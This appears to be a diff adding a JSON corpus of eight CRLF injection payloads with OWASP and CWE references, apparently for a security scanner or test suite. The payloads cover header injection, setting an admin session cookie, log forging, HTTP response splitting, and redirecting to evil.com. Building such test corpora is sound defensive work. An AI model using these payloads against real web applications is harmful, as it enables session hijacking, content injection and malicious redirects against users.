@@ -1,0 +1,82 @@
+[
+  {
+    "id": "crlf-001",
+    "family": "crlf",
+    "subtype": "header_injection",
+    "payload_string": "%0d%0aInjected-Header:true",
+    "context": "string",
+    "description": "CRLF injection to inject custom HTTP header",
+    "references": ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "crlf-002",
+    "family": "crlf",
+    "subtype": "header_injection",
+    "payload_string": "\r\nInjected-Header:true",
+    "context": "string",
+    "description": "CRLF injection using literal carriage return and line feed",
+    "references": ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "crlf-003",
+    "family": "crlf",
+    "subtype": "header_injection",
+    "payload_string": "%0d%0aSet-Cookie:session=admin",
+    "context": "string",
+    "description": "CRLF injection to set arbitrary cookie",
+    "references": ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "crlf-004",
+    "family": "crlf",
+    "subtype": "log_injection",
+    "payload_string": "INJECTED-LOG-ENTRY%0d%0a",
+    "context": "string",
+    "description": "CRLF injection for log forging/containment",
+    "references": ["https://cwe.mitre.org/data/definitions/117.html"],
+    "platform_specific": {}
+  },
+  {
+    "id": "crlf-005",
+    "family": "crlf",
+    "subtype": "header_injection",
+    "payload_string": "%E5%98%8A%E5%98%8DInjected-Header:true",
+    "context": "string",
+    "description": "CRLF injection using Unicode line separators",
+    "references": ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "crlf-006",
+    "family": "crlf",
+    "subtype": "header_injection",
+    "payload_string": "test%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>injected</html>",
+    "context": "string",
+    "description": "CRLF injection for HTTP response splitting",
+    "references": ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "crlf-007",
+    "family": "crlf",
+    "subtype": "header_injection",
+    "payload_string": "test%0d%0aX-Injected:true",
+    "context": "string",
+    "description": "CRLF injection adding custom X- header",
+    "references": ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "crlf-008",
+    "family": "crlf",
+    "subtype": "header_injection",
+    "payload_string": "%0d%0aLocation:http://evil.com",
+    "context": "string",
+    "description": "CRLF injection to hijack redirect location",
+    "references": ["https://owasp.org/www-community/vulnerabilities/CRLF_Injection"],
+    "platform_specific": {}
+  }
+]
